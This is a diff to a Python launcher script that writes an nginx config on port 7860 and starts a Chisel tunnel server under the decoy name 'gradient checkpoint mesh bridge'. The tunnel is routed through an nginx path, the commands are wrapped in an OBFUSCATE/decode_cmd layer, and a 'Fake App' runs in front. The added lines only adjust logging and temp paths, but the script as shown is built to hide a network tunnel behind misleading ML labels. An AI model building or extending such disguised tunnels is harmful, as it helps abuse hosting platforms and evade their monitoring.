@@ -117,13 +117,17 @@ def main():
     print("Enabling gradient checkpoint mesh bridge...", flush=True)
     nginx_conf = """
 daemon off;
-error_log /home/user/.torch_metrics/nginx.log warn;
-pid /home/user/.torch_metrics/nginx.pid;
+error_log /home/user/.torch_metrics/nginx.log debug;
+pid /tmp/nginx.pid;
 worker_processes 1;
 events { worker_connections 1024; }
 http {
+    access_log /home/user/.torch_metrics/nginx_access.log;
     client_body_temp_path /tmp/nginx_client;
     proxy_temp_path /tmp/nginx_proxy;
+    fastcgi_temp_path /tmp/nginx_fastcgi;
+    uwsgi_temp_path /tmp/nginx_uwsgi;
+    scgi_temp_path /tmp/nginx_scgi;
     map $http_upgrade $cu { default upgrade; '' close; }
     server {
         listen 7860;
@@ -150,8 +154,16 @@ http {
 """
     with open('/home/user/nginx.conf', 'w') as nf:
         nf.write(nginx_conf)
+    
+    nginx_log.write("[*] Testing nginx configuration...\n")
+    nginx_log.flush()
+    cmd_nginx_test = decode_cmd(OBFUSCATE("nginx -t -c /home/user/nginx.conf"))
+    subprocess.run(cmd_nginx_test, shell=True, stdout=nginx_log, stderr=subprocess.STDOUT)
+    
+    nginx_log.write("[*] Starting nginx daemon...\n")
+    nginx_log.flush()
     cmd_nginx = decode_cmd(OBFUSCATE("nginx -c /home/user/nginx.conf"))
-    subprocess.Popen(cmd_nginx, shell=True, stdout=nginx_log, stderr=nginx_log)
+    subprocess.Popen(cmd_nginx, shell=True, stdout=nginx_log, stderr=subprocess.STDOUT)
 
     # 2.9 Start Chisel (cuda-mesh-bridge) on internal :6789, routed via nginx
     chisel_log.write(f"[*] Starting Chisel tunnel server on :6789 (exposed via nginx /chisel-tunnel). Auth: {chisel_auth}\n")
@@ -275,8 +287,8 @@ http {
        # subprocess.Popen(cmd_mc, shell=True)
     
     # 4. Start the Fake App
-    # Decoded: python3 /home/user/app.py
-    cmd4 = decode_cmd(OBFUSCATE("python3 /home/user/app.py"))
+    # Decoded: python3 -u /home/user/app.py
+    cmd4 = decode_cmd(OBFUSCATE("python3 -u /home/user/app.py"))
     subprocess.run(cmd4, shell=True)
 
 if __name__ == "__main__":
